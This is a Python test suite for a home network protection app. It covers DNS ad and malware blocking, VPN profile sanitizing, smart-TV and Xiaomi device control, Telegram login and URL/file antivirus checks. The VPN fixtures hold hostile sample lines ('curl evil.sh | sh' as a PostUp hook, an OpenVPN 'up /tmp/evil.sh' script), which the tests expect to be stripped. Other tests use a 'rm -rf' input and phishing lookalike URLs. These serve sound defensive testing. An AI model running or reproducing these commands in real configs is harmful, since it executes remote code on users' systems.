import os
import socket
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
os.environ["HG_DB"] = str(Path(tempfile.mkdtemp()) / "t.db")
os.environ["HG_DEMO"] = "1"
os.environ["HG_AUTH"] = "0"  # вход через Telegram проверяется отдельными тестами

from dnslib import QTYPE, DNSRecord
from fastapi.testclient import TestClient

from homeguard import api, blocklists, db, demo, devices, dns_server


def setup_module(_):
    db.reset_for_tests()
    demo.seed()


def test_levels():
    assert blocklists.check("doubleclick.net", "basic") == (True, "ads")
    assert blocklists.check("x.y.doubleclick.net", "basic") == (True, "ads")  # поддомены
    assert blocklists.check("google-analytics.com", "basic") == (False, None)
    assert blocklists.check("google-analytics.com", "medium") == (True, "trackers")
    assert blocklists.check("blocked-malware.test", "medium") == (True, "malware")
    assert blocklists.check("evil.zip", "medium") == (False, None)
    assert blocklists.check("evil.zip", "strict") == (True, "suspicious_tld")
    assert blocklists.check("dns.google", "strict") == (True, "doh")
    assert blocklists.check("doubleclick.net", "off") == (False, None)
    assert blocklists.check("notdoubleclick.net", "strict") == (False, None)


def test_device_guess():
    assert devices.guess_type("BRAVIA-KD-55X80", "Sony") == "tv"
    assert devices.guess_type("MacBook-Air-Evelina", None) == "computer"
    assert devices.guess_type(None, None, is_gateway=True) == "router"
    assert devices.guess_type("yandexmicro-LR0000", None) == "speaker"
    assert devices.vendor_of("F8:A4:5F:00:00:00") == "Xiaomi"


def test_dns_blocking_end_to_end():
    db.set_setting("level", "medium")
    server = dns_server.start("127.0.0.1", 15353,
                              dns_server.FilteringResolver(upstream="127.0.0.1", block_ip="10.0.0.5"))
    try:
        raw = DNSRecord.question("ads.doubleclick.net").send("127.0.0.1", 15353, timeout=3)
        r = DNSRecord.parse(raw)
        assert [str(x.rdata) for x in r.rr if x.rtype == QTYPE.A] == ["10.0.0.5"]
    finally:
        server.stop()
    row = db.query("SELECT * FROM queries WHERE domain='ads.doubleclick.net'")[0]
    assert row["action"] == "blocked" and row["reason"] == "ads"


def test_api():
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    devs = c.get("/api/devices").json()
    assert devs[0]["is_self"] and len(devs) == 9
    mac = devs[1]["mac"]
    assert c.patch(f"/api/devices/{mac}", json={"name": "Телефон Али", "type": "phone"}).status_code == 200
    assert c.patch(f"/api/devices/{mac}", json={"type": "bogus"}).status_code == 400
    assert c.put("/api/settings", json={"level": "strict"}).status_code == 200
    assert c.get("/api/settings").json()["level"] == "strict"
    assert c.put("/api/settings", json={"level": "nope"}).status_code == 400
    assert c.get("/api/stats").json()["queries_24h"] > 0
    assert all(q["action"] == "blocked" for q in c.get("/api/queries?blocked=true").json())


def test_block_page_served_for_foreign_host():
    c = TestClient(api.app, base_url="http://blocked-malware.test")
    r = c.get("/some/path")
    assert r.status_code == 403
    assert "blocked-malware.test" in r.text and "Вредоносный сайт" in r.text
    assert c.get("/static/blocked.mp4").status_code == 200
    # XSS через Host не проходит
    r = TestClient(api.app).get("/", headers={"host": "a<script>.test"})
    assert "<script>" not in r.text


# ---------------- VPN ----------------
from homeguard import vpn as vpnmod

WG = """[Interface]
PrivateKey = AAAA
Address = 10.0.0.2/32
DNS = 1.1.1.1
PostUp = curl evil.sh | sh
[Peer]
PublicKey = BBBB
Endpoint = nl-1.example.com:51820
AllowedIPs = 0.0.0.0/0
"""
OVPN = """client
dev tun
remote de1.example.com 1194
script-security 2
up /tmp/evil.sh
auth-user-pass
<ca>
-----BEGIN CERTIFICATE-----
up not-a-directive-inside-block
-----END CERTIFICATE-----
</ca>
"""


def _mgr(tmp_path):
    from homeguard import config
    config.VPN_DIR = tmp_path
    return vpnmod.VpnManager(vpnmod.Runner(dry_run=True))


def test_vpn_sanitize_strips_dangerous_lines():
    text, ep = vpnmod.sanitize("wireguard", WG)
    assert "PostUp" not in text and "DNS" not in text and ep == "nl-1.example.com:51820"
    text, ep = vpnmod.sanitize("openvpn", OVPN)
    assert "script-security" not in text and "\nup /tmp" not in text
    assert "up not-a-directive-inside-block" in text  # внутри <ca> не трогаем
    assert ep == "de1.example.com:1194"


def test_vpn_rejects_garbage():
    for bad in ("hello", "[Interface]\n[Peer]\n"):
        try:
            vpnmod.sanitize(vpnmod.detect_kind(bad), bad)
        except vpnmod.VpnError:
            continue
        raise AssertionError("должно быть отклонено")


def test_vpn_connect_switch_disconnect(tmp_path):
    m = _mgr(tmp_path)
    a = m.add_profile("Планета NL", WG)
    b = m.add_profile("Планета DE", OVPN, username="u", password="p")
    assert a["country"] == "NL" and a["flag"] == "🇳🇱" and b["country"] == "DE" and b["has_auth"]
    assert oct((tmp_path / f"{a['id']}.conf").stat().st_mode & 0o777) == "0o600"
    m.set_kill_switch(True)
    m.connect(a["id"])
    cmds = [" ".join(c) for c in m.runner.history]
    assert any(c.startswith("wg-quick up") for c in cmds)
    assert any("MASQUERADE" in c and "-A" in c for c in cmds)
    assert any("! -o hgvpn -j DROP" in c for c in cmds)  # kill switch
    assert m.status()["state"] == "connected"
    m.runner.history.clear()
    m.connect(b["id"])  # переключение: старые правила и туннель снимаются
    cmds = [" ".join(c) for c in m.runner.history]
    assert any("-D POSTROUTING" in c for c in cmds) and any(c.startswith("openvpn") for c in cmds)
    assert any("--auth-user-pass" in c for c in cmds)
    m.disconnect()
    assert m.status()["state"] == "disconnected"
    m.delete_profile(a["id"])
    assert not (tmp_path / f"{a['id']}.conf").exists()


def test_vpn_api(tmp_path, monkeypatch):
    from homeguard import config
    monkeypatch.setattr(vpnmod, "manager", _mgr(tmp_path))
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    r = c.post("/api/vpn/profiles", json={"name": "Финляндия", "content": WG})
    assert r.status_code == 200 and "PrivateKey" not in r.text
    pid = r.json()["id"]
    assert c.post("/api/vpn/profiles", json={"name": "x", "content": "junk"}).status_code == 400
    assert c.post("/api/vpn/connect", json={"id": pid}).json()["state"] == "connected"
    assert c.post("/api/vpn/connect", json={"id": "nope"}).status_code == 400
    assert c.put("/api/vpn/settings", json={"kill_switch": True}).json()["kill_switch"] is True
    # страница блокировки входа не требует
    assert TestClient(api.app, base_url="http://blocked-malware.test").get("/").status_code == 403


# ---------------- Bravia ----------------
sys.path.insert(0, str(Path(__file__).resolve().parent))
import fake_bravia
from homeguard import bravia, config as hgconfig


def _tv_server(monkeypatch):
    st = fake_bravia.make_state()
    srv = fake_bravia.serve(st)
    monkeypatch.setattr(hgconfig, "BRAVIA_PORT", srv.server_address[1])
    return st, srv


def test_bravia_ip_must_be_local():
    for bad in ("8.8.8.8", "example.com", "0.0.0.0", "::1"):
        try:
            bravia.check_ip(bad)
        except bravia.BraviaError:
            continue
        raise AssertionError(bad)
    assert bravia.check_ip("192.168.3.30") == "192.168.3.30"


def test_bravia_client(monkeypatch):
    st, srv = _tv_server(monkeypatch)
    tv = bravia.Bravia("127.0.0.1", "1234", port=srv.server_address[1])
    assert tv.power() and tv.info()["model"] == "KD-55X80J"
    tv.set_volume(30); tv.set_mute(True)
    assert tv.volume() == {"volume": 30, "mute": True, "min": 0, "max": 100}
    assert [i["title"] for i in tv.inputs()] == ["HDMI 1", "HDMI 2"]
    tv.set_input("extInput:hdmi?port=2"); assert st.input.endswith("2")
    tv.launch_app("com.sony.dtv.com.netflix.ninja"); assert "netflix" in st.app
    tv.press("Home"); assert st.pressed == ["AAA-Home"]
    tv.set_power(False); assert tv.power() is False
    try:
        bravia.Bravia("127.0.0.1", "wrong", port=srv.server_address[1]).power()
    except bravia.BraviaError as e:
        assert "Pre-Shared Key" in str(e)
    else:
        raise AssertionError
    srv.shutdown()


def test_bravia_api(monkeypatch):
    st, srv = _tv_server(monkeypatch)
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    r = c.post("/api/tvs", json={"name": "Гостиная", "ip": "127.0.0.1", "psk": "1234"})
    assert r.status_code == 200 and "psk" not in r.text
    tid = r.json()["id"]
    assert "psk" not in c.get("/api/tvs").text
    assert c.post("/api/tvs", json={"name": "x", "ip": "8.8.8.8", "psk": "1"}).status_code == 400
    s = c.get(f"/api/tvs/{tid}/state").json()
    assert s["power"] and s["audio"]["volume"] == 12
    assert c.post(f"/api/tvs/{tid}/volume", json={"level": 40}).status_code == 200 and st.volume == 40
    assert c.post(f"/api/tvs/{tid}/power", json={"on": False}).status_code == 200
    assert c.get(f"/api/tvs/{tid}/state").json() == {"power": False}
    assert c.post(f"/api/tvs/{tid}/power", json={"on": True}).status_code == 200
    assert c.post(f"/api/tvs/{tid}/press", json={"button": "Up"}).status_code == 200
    assert c.post(f"/api/tvs/{tid}/press", json={"button": "rm -rf"}).status_code == 400
    assert c.get(f"/api/tvs/{tid}/apps").json()[0]["title"] == "YouTube"
    srv.shutdown()
    assert c.get(f"/api/tvs/{tid}/state").status_code == 502  # ТВ недоступен
    assert c.get("/api/tvs/nope/state").status_code == 404
    c.delete(f"/api/tvs/{tid}")


# ---------------- Xiaomi (miIO / MIoT) ----------------
import json as _json
import shutil
import fake_miio
from homeguard import miio as miiomod, miot as miotmod

TOKEN = "00112233445566778899aabbccddeeff"


def _miot_env(monkeypatch, tmp_path):
    cache = tmp_path / "miot"
    cache.mkdir()
    shutil.copy(Path(__file__).parent / "fixtures" / "mibx2.washer.v1.json", cache / "mibx2.washer.v1.json")
    monkeypatch.setattr(hgconfig, "MIOT_DIR", cache)
    washer = fake_miio.Washer()
    handle = fake_miio.serve(washer, TOKEN)
    monkeypatch.setattr(hgconfig, "MIIO_PORT", handle.port)
    return washer, handle


def test_miio_crypto_roundtrip():
    tok = bytes.fromhex(TOKEN)
    assert miiomod.decrypt(tok, miiomod.encrypt(tok, b'{"a":1}')) == b'{"a":1}'


def test_miio_client_and_wrong_token(monkeypatch, tmp_path):
    washer, h = _miot_env(monkeypatch, tmp_path)
    dev = miiomod.MiioDevice("127.0.0.1", TOKEN, port=h.port, timeout=0.5, retries=0)
    assert dev.info()["model"] == "mibx2.washer.v1"
    assert dev.get_properties([(2, 2), (2, 10)]) == {(2, 2): 1, (2, 10): 0}
    bad = miiomod.MiioDevice("127.0.0.1", "ff" * 16, port=h.port, timeout=0.4, retries=0)
    try:
        bad.info()
    except miiomod.MiioError as e:
        assert "не отвечает" in str(e)
    else:
        raise AssertionError
    h.close()


def test_miot_spec_and_validation(monkeypatch, tmp_path):
    _miot_env(monkeypatch, tmp_path)
    spec = miotmod.load_spec("mibx2.washer.v1")
    by = {(p["siid"], p["piid"]): p for p in spec["properties"]}
    assert by[(2, 2)]["label"] == "Состояние" and by[(2, 2)]["writable"] is False
    assert {"label": "Идёт стирка", "value": 3} in by[(2, 2)]["values"]
    assert not any(p["service"] == "device-information" for p in spec["properties"])
    assert miotmod.validate_value(by[(2, 7)], 4) == 4
    for bad in (99, "4", True, 1.5):
        try:
            miotmod.validate_value(by[(2, 7)], bad)
        except miotmod.MiotError:
            continue
        raise AssertionError(bad)
    assert [a["name"] for a in spec["actions"] if a["siid"] == 2] == ["start-wash", "pause"]


def test_home_api(monkeypatch, tmp_path):
    washer, h = _miot_env(monkeypatch, tmp_path)
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    assert c.post("/api/home", json={"name": "x", "ip": "127.0.0.1", "token": "zz"}).status_code == 400
    assert c.post("/api/home", json={"name": "x", "ip": "8.8.8.8", "token": TOKEN}).status_code == 400
    r = c.post("/api/home", json={"name": "Стиралка", "ip": "127.0.0.1", "token": TOKEN})
    assert r.status_code == 200 and r.json()["model"] == "mibx2.washer.v1" and TOKEN not in r.text
    did = r.json()["id"]
    assert TOKEN not in c.get("/api/home").text
    st = c.get(f"/api/home/{did}/state").json()
    assert st["2.2"] == 1 and st["2.7"] == 4
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 7, "value": 6}).status_code == 200
    assert washer.props[(2, 7)] == 6
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 7, "value": 12345}).status_code == 400
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 2, "value": 3}).status_code == 400  # read-only
    assert c.post(f"/api/home/{did}/set", json={"siid": 9, "piid": 9, "value": 1}).status_code == 400  # нет в спеке
    assert c.post(f"/api/home/{did}/action", json={"siid": 2, "aiid": 1}).status_code == 200
    assert washer.actions == [(2, 1)] and c.get(f"/api/home/{did}/state").json()["2.2"] == 3
    assert c.post(f"/api/home/{did}/action", json={"siid": 2, "aiid": 77}).status_code == 400
    h.close()
    assert c.get(f"/api/home/{did}/state").status_code == 502
    c.delete(f"/api/home/{did}")


# ---------------- Home Assistant / Яндекс Станция ----------------
import fake_ha
from homeguard import ha as hamod


def test_ha_url_must_be_local():
    for bad in ("http://8.8.8.8:8123", "https://evil.example.com", "http://1.2.3.4"):
        try:
            hamod.normalize_url(bad)
        except hamod.HAError:
            continue
        raise AssertionError(bad)
    assert hamod.normalize_url("192.168.3.2:8123/") == "http://192.168.3.2:8123"
    assert hamod.normalize_url("homeassistant.local:8123") == "http://homeassistant.local:8123"
    assert hamod.normalize_url("homeassistant:8123") == "http://homeassistant:8123"


def test_ha_build_service_validation():
    assert hamod.build_service("command", "media_player.x", " включи музыку ") == (
        "play_media", {"entity_id": "media_player.x", "media_content_type": "text_command",
                       "media_content_id": "включи музыку"})
    assert hamod.build_service("volume", "media_player.x", 0.5)[1]["volume_level"] == 0.5
    for args in (("volume", "media_player.x", 7), ("volume", "media_player.x", True),
                 ("play", "light.kitchen"), ("play", "media_player.x/../y"), ("hack", "media_player.x"),
                 ("tts", "media_player.x", ""), ("mute", "media_player.x", "yes")):
        try:
            hamod.build_service(*args)
        except hamod.HAError:
            continue
        raise AssertionError(args)


def test_ha_api():
    srv, calls = fake_ha.serve()
    base = f"http://127.0.0.1:{srv.server_address[1]}"
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    assert c.get("/api/ha").json()["configured"] is False
    assert c.get("/api/ha/players").status_code == 400
    assert c.put("/api/ha", json={"url": base, "token": "x" * 40}).status_code == 400  # неверный токен
    assert c.get("/api/ha").json()["configured"] is False
    r = c.put("/api/ha", json={"url": base, "token": fake_ha.TOKEN})
    assert r.status_code == 200 and fake_ha.TOKEN not in r.text and fake_ha.TOKEN not in c.get("/api/ha").text
    pl = c.get("/api/ha/players").json()
    assert [p["entity_id"] for p in pl] == ["media_player.yandex_station_mini", "media_player.living_room_tv"]
    assert pl[0]["yandex"] and pl[0]["title"] == "Звуки дождя" and not pl[1]["yandex"]
    eid = pl[0]["entity_id"]
    assert c.post(f"/api/ha/players/{eid}/volume", json={"value": 0.55}).status_code == 200
    assert c.post(f"/api/ha/players/{eid}/command", json={"value": "включи свет на кухне"}).status_code == 200
    assert calls[-1] == ("/api/services/media_player/play_media", {
        "entity_id": eid, "media_content_type": "text_command", "media_content_id": "включи свет на кухне"})
    assert c.get("/api/ha/players").json()[0]["volume"] == 0.55
    assert c.post(f"/api/ha/players/{eid}/volume", json={"value": 5}).status_code == 400
    assert c.post("/api/ha/players/light.kitchen/play", json={}).status_code == 400
    c.delete("/api/ha")
    assert c.get("/api/ha").json()["configured"] is False
    srv.shutdown()


# ---------------- Вход через Telegram ----------------
from homeguard import auth as authmod, telegram as tgmod


def _tg_update(uid, text, uname="vasya", first="Вася"):
    return {"update_id": 1, "message": {"text": text, "chat": {"id": uid, "type": "private"},
                                        "from": {"id": uid, "first_name": first, "username": uname}}}


def test_telegram_login_flow(monkeypatch):
    monkeypatch.setattr(hgconfig, "AUTH", True)
    monkeypatch.setattr(hgconfig, "TG_TOKEN", "123:abc")
    db.set_setting("tg_username", "hg_test_bot")
    sent = []
    monkeypatch.setattr(tgmod.bot, "send", lambda chat, text, markup=None: sent.append((chat, text, markup)))
    monkeypatch.setattr(tgmod, "api", lambda *a, **k: {})
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")

    assert c.get("/api/devices").status_code == 401
    st = c.get("/api/auth/state").json()
    assert st["bot_configured"] and not st["has_owner"] and st["user"] is None

    # 1) первый вход — владелец
    r = c.post("/api/auth/start", json={"kind": "web"}).json()
    assert r["link"] == f"https://t.me/hg_test_bot?start={r['nonce']}"
    assert c.get("/api/auth/poll", params={"nonce": r["nonce"]}).json()["status"] == "waiting"
    tgmod.bot.handle(_tg_update(111, f"/start {r['nonce']}"))
    p = c.get("/api/auth/poll", params={"nonce": r["nonce"]})
    assert p.json() == {"status": "approved"} and "hg_session" in p.cookies
    assert c.get("/api/devices").status_code == 200
    assert c.get("/api/auth/state").json()["user"]["role"] == "owner"
    # токен выдаётся один раз
    assert c.get("/api/auth/poll", params={"nonce": r["nonce"]}).json()["status"] == "taken"

    # 2) второй человек ждёт подтверждения владельца (вход из приложения → токен в ответе)
    c2 = TestClient(api.app, base_url="http://127.0.0.1:8080")
    r2 = c2.post("/api/auth/start", json={"kind": "app"}).json()
    tgmod.bot.handle(_tg_update(222, f"/start {r2['nonce']}", "petya", "Петя"))
    assert c2.get("/api/auth/poll", params={"nonce": r2["nonce"]}).json()["status"] == "pending_owner"
    owner_msg = [m for m in sent if m[0] == 111 and m[2]][-1]
    btn = owner_msg[2]["inline_keyboard"][0][0]["callback_data"]
    # чужой не может подтвердить
    tgmod.bot.handle({"update_id": 2, "callback_query": {"id": "x", "from": {"id": 222}, "data": btn}})
    assert c2.get("/api/auth/poll", params={"nonce": r2["nonce"]}).json()["status"] == "pending_owner"
    tgmod.bot.handle({"update_id": 3, "callback_query": {"id": "y", "from": {"id": 111}, "data": btn}})
    p2 = c2.get("/api/auth/poll", params={"nonce": r2["nonce"]}).json()
    assert p2["status"] == "approved" and p2["token"]
    hdr = {"Authorization": f"Bearer {p2['token']}"}
    assert c2.get("/api/vpn", headers=hdr).status_code == 200
    assert c2.get("/api/users", headers=hdr).status_code == 403  # участник, не владелец
    assert len(c.get("/api/users").json()) == 2

    # бот: команды только своим
    sent.clear()
    tgmod.bot.handle(_tg_update(333, "/status", "stranger"))
    assert "открой панель" in sent[-1][1]
    tgmod.bot.handle(_tg_update(111, "/level strict"))
    assert db.get_setting("level") == "strict"
    tgmod.bot.handle(_tg_update(111, "/status"))
    assert "Устройств в сети" in sent[-1][1]

    # владелец выгоняет участника — его сессия больше не работает
    assert c.delete("/api/users/222").status_code == 200
    assert c2.get("/api/vpn", headers=hdr).status_code == 401
    assert c.delete("/api/users/111").status_code == 400  # себя-владельца нельзя
    # после появления владельца бота может менять только он
    assert c2.put("/api/auth/bot", json={"token": "x"}).status_code == 403
    c.post("/api/auth/logout")
    assert c.get("/api/devices").status_code == 401
    db.set_setting("level", "medium")


def test_login_link_expires(monkeypatch):
    n = authmod.start_login("web")
    db.execute("UPDATE login_requests SET created = 0 WHERE nonce = ?", (n,))
    assert authmod.bot_start(n, 999, "X", None) == "expired"
    assert authmod.poll(n) == ("expired", None)


# ---------------- Антивирус ----------------
import http.server
import threading as _th
from homeguard import antivirus as av


def test_av_heuristics_offline():
    r = av.check_url("http://sberbank-bonus.ru/login")
    assert r["verdict"] == "danger" and any("sberbank" in f["text"] for f in r["findings"])
    assert av.check_url("https://online.sberbank.ru/")["verdict"] == "safe"
    assert av.check_url("gosuslugi.ru")["verdict"] == "safe"
    assert av.check_url("http://gosusIugi.ru")["verdict"] == "danger"  # I вместо l → одна правка
    assert av.check_url("http://blocked-phishing.test/")["verdict"] == "danger"
    assert av.check_url("http://xn--80ak6aa92e.com")["verdict"] == "suspicious"
    assert av.check_url("http://google.com@evil.example/")["verdict"] == "danger"
    assert av.check_url("https://github.com/")["verdict"] == "safe"


def test_av_file_checks():
    assert av.check_file(b"%PDF-1.4 hello", "report.pdf")["verdict"] == "safe"
    r = av.check_file(b"MZ\x90\x00", "Договор.pdf.exe")
    assert r["verdict"] == "danger" and len(r["sha256"]) == 64
    assert av.check_file(b"MZ\x90", "photo.jpg")["verdict"] == "danger"
    assert av.check_file(b"PK..", "app.apk")["verdict"] == "suspicious"


def _fake_cloud():
    calls = []

    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, obj, code=200):
            data = _json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_POST(self):  # Safe Browsing
            body = _json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            calls.append(("gsb", [e["url"] for e in body["threatInfo"]["threatEntries"]]))
            bad = [e for e in body["threatInfo"]["threatEntries"] if "evil" in e["url"]]
            self._send({"matches": [{"threat": e, "threatType": "SOCIAL_ENGINEERING"} for e in bad]})

        def do_GET(self):  # VirusTotal
            calls.append(("vt", self.path))
            if self.headers.get("x-apikey") != "vtkey":
                return self._send({}, 401)
            if "/files/" in self.path:
                return self._send({}, 404)
            self._send({"data": {"attributes": {"last_analysis_stats": {"malicious": 5, "harmless": 60}}}})

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    _th.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, calls


def test_av_cloud_and_watch(monkeypatch, tmp_path):
    srv, calls = _fake_cloud()
    base = f"http://127.0.0.1:{srv.server_address[1]}"
    monkeypatch.setattr(hgconfig, "GSB_URL", base + "/gsb")
    monkeypatch.setattr(hgconfig, "VT_URL", base + "/vt")
    monkeypatch.setattr(hgconfig, "GSB_KEY", "gkey")
    monkeypatch.setattr(hgconfig, "VT_KEY", "vtkey")
    lists = tmp_path / "lists"
    shutil.copytree(hgconfig.BLOCKLIST_DIR, lists)
    monkeypatch.setattr(hgconfig, "BLOCKLIST_DIR", lists)
    alerts = []
    monkeypatch.setattr(tgmod.bot, "alert", lambda text, key, cooldown=600: alerts.append(text))

    r = av.check_url("http://evil-site.example/x")
    srcs = {f["source"]: f["level"] for f in r["findings"]}
    assert r["verdict"] == "danger" and srcs["Google Safe Browsing"] == "danger" and srcs["VirusTotal"] == "danger"
    f = av.check_file(b"hello", "notes.txt")
    assert any(x["source"] == "VirusTotal" and x["level"] == "unknown" for x in f["findings"])

    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    assert c.get("/api/av/keys").json()["gsb"] is True
    up = c.post("/api/av/file", content=b"MZ..", headers={"X-Filename": "%D1%84%D0%BE%D1%82%D0%BE.jpg"})
    assert up.json()["target"] == "фото.jpg" and up.json()["verdict"] == "danger"
    assert c.post("/api/av/url", json={"url": "github.com"}).json()["verdict"] in ("safe", "danger")
    assert len(c.get("/api/av/history").json()) >= 3

    # сторож: новый домен из DNS-журнала → Safe Browsing → блок-лист + тревога
    db.set_setting("av_watch_id", str(db.query("SELECT MAX(id) m FROM queries")[0]["m"]))
    db.log_query("192.168.3.21", "evil-new.example", "A", "allowed", None)
    db.log_query("192.168.3.21", "good.example", "A", "allowed", None)
    assert av.watch_once() == 1
    assert blocklists.check("evil-new.example", "medium") == (True, "phishing")
    assert alerts and "evil-new.example" in alerts[0]
    assert av.watch_once() == 0  # повторно не проверяет
    srv.shutdown()
    blocklists.load(force=True)
